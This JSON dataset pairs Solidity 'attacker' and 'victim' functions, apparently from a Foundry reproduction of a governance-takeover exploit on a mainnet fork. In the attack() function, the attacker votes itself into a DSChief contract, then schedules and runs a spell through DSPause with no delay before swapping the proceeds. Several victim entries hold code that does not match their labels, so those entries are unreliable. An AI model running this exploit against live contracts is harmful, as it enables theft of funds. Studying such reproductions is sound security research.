[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "attack",
    "original_code": "    function attack() public {\n        cgt.approve(address(chief), type(uint256).max);\n        chief.lock(20 ether);\n        address[] memory yays = new address[](1);\n        yays[0] = address(this);\n        chief.vote(yays);\n        chief.lift(address(this));\n        spell = new Spell();\n        address spelladdr = address(spell);\n        bytes32 tag;\n        assembly {\n            tag := extcodehash(spelladdr)\n        }\n        uint256 delay = block.timestamp + 0;\n        bytes memory sig = abi.encodeWithSignature(\"act(address,address)\", address(this), address(cgt));\n        pause.plot(address(spell), tag, sig, delay);\n        pause.exec(address(spell), tag, sig, delay);\n        _swap0();\n        _swap1();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() external {\n        cheats.createSelectFork(\"mainnet\", 19_498_910);\n        deal(address(cgt), address(this), 80 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        attack();\n        emit log_named_decimal_uint(\"[End] Attacker CGT after exploit\", cgt.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[End] Attacker dai after exploit\", dai.balanceOf(address(this)), 18);\n        emit log_named_decimal_uint(\"[End] Attacker weth after exploit\", weth.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDSChief",
    "source_type": "victim_contract",
    "function_name": "free",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDSChief",
    "source_type": "victim_contract",
    "function_name": "lift",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDSChief",
    "source_type": "victim_contract",
    "function_name": "lock",
    "original_code": "    function lock(bytes32 to, IERC20 token, uint256 amount) external \n        Pause.whenNotPaused()\n        TokenManager.OnlyActiveToken(token)\n        Blacklist.NotBlacklistedEth(Context._msgSender())\n        Blacklist.NotBlacklistedSub(to)\n    {\n        token.transferFrom(Context._msgSender(), address(this), amount);\n        \n        emit Lock(outRequestId++, to, token, amount);\n    }\n\n    /// @inheritdoc IBridge\n    function unlock(uint256 id, address to, IERC20 token, uint256 amount) public \n        AccessControl.onlyRole(managerRole)\n        Pause.whenNotPaused()\n    {\n        _unlock(id, to, token, amount);\n    }\n\n    /// @inheritdoc IBridge\n    function batchUnlock(UnlockData[] memory data) external \n        AccessControl.onlyRole(managerRole) \n        Pause.whenNotPaused()\n    {\n        for(uint256 i = 0; i < data.length; i++) {\n            _unlock(data[i].id, data[i].to, data[i].token, data[i].amount);\n        }\n    }\n\n    function _unlock(uint256 id, address to, IERC20 token, uint256 amount) private \n        TokenManager.OnlyActiveToken(token)\n        Blacklist.NotBlacklistedEth(to)\n    {\n        if(inRequestProcessed[id]) {\n            revert RequestAlreadyProcessed(id);\n        }\n\n        inRequestProcessed[id] = true;\n\n        token.transfer(to, amount);\n\n        emit Unlock(id, to, token, amount);\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IDSChief",
    "source_type": "victim_contract",
    "function_name": "vote",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address guy) external returns (bool) {\n        return approve(guy, uint(-1));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "burn",
    "original_code": "    function burn(\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Swap token0 for token1, or token1 for token0\n    /// @dev The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\n    /// @param recipient The address to receive the output of the swap\n    /// @param zeroForOne The direction of the swap, true for token0 to token1, false for token1 to token0\n    /// @param amountSpecified The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\n    /// @param sqrtPriceLimitX96 The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this\n    /// value after the swap. If one for zero, the price cannot be greater than this value after the swap\n    /// @param data Any data to be passed through to the callback\n    /// @return amount0 The delta of the balance of token0 of the pool, exact when negative, minimum when positive\n    /// @return amount1 The delta of the balance of token1 of the pool, exact when negative, minimum when positive\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit(uint256 underlyingAmount) external nonReentrant {\n        uint256 amount = wrappedAssetAmount(underlyingAmount);\n        require(amount > 0, \"ERC20Wrapper: amount cannot be zero\");\n\n        underlyingERC20.safeTransferFrom(\n            address(msg.sender),\n            address(this),\n            underlyingAmount\n        );\n\n        _mint(address(msg.sender), amount);\n\n        emit Deposit(address(msg.sender), underlyingAmount, amount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external returns (uint256 amount0, uint256 amount1);\n\n    /// @notice Collects tokens owed to a position\n    /// @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.\n    /// Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or\n    /// amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the\n    /// actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\n    /// @param recipient The address which should receive the fees collected\n    /// @param tickLower The lower tick of the position for which to collect fees\n    /// @param tickUpper The upper tick of the position for which to collect fees\n    /// @param amount0Requested How much token0 should be withdrawn from the fees owed\n    /// @param amount1Requested How much token1 should be withdrawn from the fees owed\n    /// @return amount0 The amount of fees collected in token0\n    /// @return amount1 The amount of fees collected in token1\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "start",
    "original_code": "    function start() public auth {\n        stopped = false;\n        emit Start();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "stop",
    "original_code": "    function stop() public auth {\n        stopped = true;\n        emit Stop();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address dst, uint wad) external returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint wad)\n        public\n        stoppable\n        returns (bool)\n    {\n        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n            require(allowance[src][msg.sender] >= wad, \"ds-token-insufficient-approval\");\n            allowance[src][msg.sender] = sub(allowance[src][msg.sender], wad);\n        }\n\n        require(balanceOf[src] >= wad, \"ds-token-insufficient-balance\");\n        balanceOf[src] = sub(balanceOf[src], wad);\n        balanceOf[dst] = add(balanceOf[dst], wad);\n\n        emit Transfer(src, dst, wad);\n\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address src, address dst, uint wad)\n        public\n        stoppable\n        returns (bool)\n    {\n        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n            require(allowance[src][msg.sender] >= wad, \"ds-token-insufficient-approval\");\n            allowance[src][msg.sender] = sub(allowance[src][msg.sender], wad);\n        }\n\n        require(balanceOf[src] >= wad, \"ds-token-insufficient-balance\");\n        balanceOf[src] = sub(balanceOf[src], wad);\n        balanceOf[dst] = add(balanceOf[dst], wad);\n\n        emit Transfer(src, dst, wad);\n\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMERC20",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint256 underlyingAmount) external nonReentrant {\n        _withdraw(address(msg.sender), wrappedAssetAmount(underlyingAmount), underlyingAmount);\n    }\n\n\n    function _withdraw(address account, uint256 amount, uint256 underlyingAmount) internal {\n        require(amount > 0, \"ERC20Wrapper: amount cannot be zero\");\n        require(underlyingAmount > 0, \"ERC20Wrapper: underlyingAmount cannot be zero\");\n\n        _burn(account, amount);\n\n        underlyingERC20.safeTransfer(\n            account,\n            underlyingAmount\n        );\n\n        emit Withdrawal(account, underlyingAmount, amount);\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "Spell",
    "source_type": "victim_contract",
    "function_name": "act",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IJoin",
    "source_type": "victim_contract",
    "function_name": "exit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDSPause",
    "source_type": "victim_contract",
    "function_name": "exec",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IDSPause",
    "source_type": "victim_contract",
    "function_name": "plot",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ISkaleB",
    "source_type": "victim_contract",
    "function_name": "depositERC20Direct",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IVat",
    "source_type": "victim_contract",
    "function_name": "hope",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IVat",
    "source_type": "victim_contract",
    "function_name": "suck",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IBobaB",
    "source_type": "victim_contract",
    "function_name": "depositERC20To",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IOmniBridge",
    "source_type": "victim_contract",
    "function_name": "dailyLimit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IOmniBridge",
    "source_type": "victim_contract",
    "function_name": "getCurrentDay",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IOmniBridge",
    "source_type": "victim_contract",
    "function_name": "relayTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IOmniBridge",
    "source_type": "victim_contract",
    "function_name": "totalSpentPerDay",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IRouterV3s",
    "source_type": "victim_contract",
    "function_name": "exactInput",
    "original_code": "    function exactInput(ExactInputParams memory params)\n        external\n        payable\n        override\n        checkDeadline(params.deadline)\n        returns (uint256 amountOut)\n    {\n        address payer = msg.sender; // msg.sender pays for the first hop\n\n        while (true) {\n            bool hasMultiplePools = params.path.hasMultiplePools();\n\n            // the outputs of prior swaps become the inputs to subsequent ones\n            params.amountIn = exactInputInternal(\n                params.amountIn,\n                hasMultiplePools ? address(this) : params.recipient, // for intermediate swaps, this contract custodies\n                0,\n                SwapCallbackData({\n                    path: params.path.getFirstPool(), // only the first pool in the path is necessary\n                    payer: payer\n                })\n            );\n\n            // decide whether to continue or terminate\n            if (hasMultiplePools) {\n                payer = address(this); // at this point, the caller has paid\n                params.path = params.path.skipToken();\n            } else {\n                amountOut = params.amountIn;\n                break;\n            }\n        }\n\n        require(amountOut >= params.amountOutMinimum, 'Too little received');\n    }\n\n    /// @dev Performs a single exact output swap\n",
    "description": ""
  },
  {
    "contract/interface": "IRouterV3s",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForTokens",
    "original_code": "    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external virtual override ensure(deadline) returns (uint[] memory amounts) {\n        amounts = UniswapV2Library.getAmountsOut(factory, amountIn, path);\n        require(amounts[amounts.length - 1] >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amounts[0]\n        );\n        _swap(amounts, path, to);\n    }\n",
    "description": ""
  }
]